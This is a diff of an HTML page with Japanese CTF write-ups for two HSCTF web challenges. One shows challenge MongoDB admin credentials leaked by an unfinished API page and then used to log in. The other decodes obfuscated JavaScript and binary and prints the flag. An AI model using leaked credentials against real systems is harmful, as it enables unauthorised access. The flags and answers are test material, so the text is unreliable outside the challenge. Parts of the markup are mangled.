-<p>最初は、<a href="https://keith-logger.web.chal.hsctf.com/api/record">https://keith-logger.web.chal.hsctf.com/api/record</a> の方にいろんなGETを投げてごちゃごちゃやってたんですが、Time情報が取れるだったので諦めて、次の <a href="https://keith-logger.web.chal.hsctf.com/api/admin">https://keith-logger.web.chal.hsctf.com/api/admin</a>  の方にアクセス。</p>
-
-<p><br />
-以下が返ってきました。
-<pre>
-didn&rsquo;t have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
-</pre></p>
-
-<p><br />
+</div><p>最初は、https://keith-logger.web.chal.hsctf.com/api/record の方にいろんなGETを投げてごちゃごちゃやってたんですが、Time情報が取れるだったので諦めて、次の <a href="https://keith-logger.web.chal.hsctf.com/api/admin">https://keith-logger.web.chal.hsctf.com/api/admin</a>  の方にアクセス。</p>
+<p><!-- raw HTML omitted -->
+以下が返ってきました。</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted -->
 mongodbには、<code>Robo 3T</code>というツールを使いました。
-<br />
-<img src="https://captureamerica.github.io/writeups/img/Keith_Bot_Mongo.png" alt="Keith_Bot_Mongo.png"></p>
-
-<p><br /><br />
-<br /><br /></p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 <h1 id="accessible-rich-internet-applications-web">Accessible Rich Internet Applications (Web)</h1>
-
-<hr />
-
+<hr>
 <blockquote>
 <p>A very considerate fellow, Rob believes that accessibility is very important!
-<br /><br />
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 NOTE: The flag for this challenge starts with flag{ instead of hsctf{</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>index.html</li>
 </ul>
-
-<h2 id="solution-19">Solution</h2>
-
+<h2 id="solution19">Solution</h2>
 <p>添付の<code>index.html</code>には難読化された非常に長いJavascriptが含まれています。
-<br />
+<!-- raw HTML omitted -->
 ChromeのDeveloper ToolsでまずBeautifyして、mをWatchに追加して実行し、mを別ファイル（aaa.htm）として保存しました。
-<br />
-<img src="https://captureamerica.github.io/writeups/img/index.png" alt="index.png">
-<br /><br />
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 同様に、今度は先程保存したaaa.htmをChromeのDeveloper ToolsでまずBeautifyします。
-<br />
-<img src="https://captureamerica.github.io/writeups/img/aaa.png" alt="aaa.png">
-<br /><br />
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
 これを、bbb.txtとして保存しておきます。
-<br /><br />
-&ldquo;0&rdquo;と&rdquo;1&rdquo;が見えるので、2進数を文字列に変換する系ですね。ただし、<code>aria-posinset</code>の箇所で順番が指定されているようなので、sortが必要です。</p>
-
+<!-- raw HTML omitted --><!-- raw HTML omitted -->
+&ldquo;0&quot;と&quot;1&quot;が見えるので、2進数を文字列に変換する系ですね。ただし、<code>aria-posinset</code>の箇所で順番が指定されているようなので、sortが必要です。</p>
 <p><code>$ grep 1040 bbb.txt | cut -d'&quot;' -f4,7 | sort -n | sed -E 's/.*&gt;([01]).*/\1/' | tr -d '\n' ; echo</code>
 01101001011011010010000001100111011011110110111001101110011000010010000001100001011001000110010000100000011100110110111101101101011001010010000001100110011010010110110001101100011001010111001000100000011101000110010101111000011101000010000001101000011001010111001001100101001000000111001101101111001000000111010001101000011001010010000001110000011000010110011101100101001000000110100101110011001000000110000100100000011000100110100101110100001000000110110001101111011011100110011101100101011100100010111000100000011011000110111101110010011001010110110100100000011010010111000001110011011101010110110100101110001011100010111000100000011010000110010101110010011001010010011101110011001000000111010001101000011001010010000001100110011011000110000101100111001000000110001001110100011101110010110000100000011001100110110001100001011001110111101101100001011000110110001101100101011100110111001101101001011000100110100101101100011010010111010001111001010111110110100101110011010111110110001101110010011101010110001101101001011000010110110001111101</p>
-
-<p><br />
-文字列への変換は、またこちらのサイトにお世話になりました。<br />
-<a href="https://dencode.com/ja/string/bin">https://dencode.com/ja/string/bin</a></p>
-
-<p>im gonna add some filler text here so the page is a bit longer. lorem ipsum&hellip; here&rsquo;s the flag btw, flag{accessibility_is_crucial}</p>
-
-<p><br /><br />
-<br /><br /></p>
-
-<hr />
-
-<p><br /><br />
-<br /><br /></p>
+<p><!-- raw HTML omitted -->
+文字列への変換は、またこちらのサイトにお世話になりました。<!-- raw HTML omitted -->
+<a href="https://dencode.com/ja/string/bin"><a href="https://dencode.com/ja/string/bin">https://dencode.com/ja/string/bin</a></a></p>
+<p>im gonna add some filler text here so the page is a bit longer. lorem ipsum&hellip; here's the flag btw, flag{accessibility_is_crucial}</p>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<hr>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
 
     </div>
 
@@ -1777,6 +1511,10 @@ ChromeのDeveloper ToolsでまずBeautifyして、mをWatchに追加して実行
   </article>
         </div>
         
+
+  
+
+  
 
       </div>
     </main>
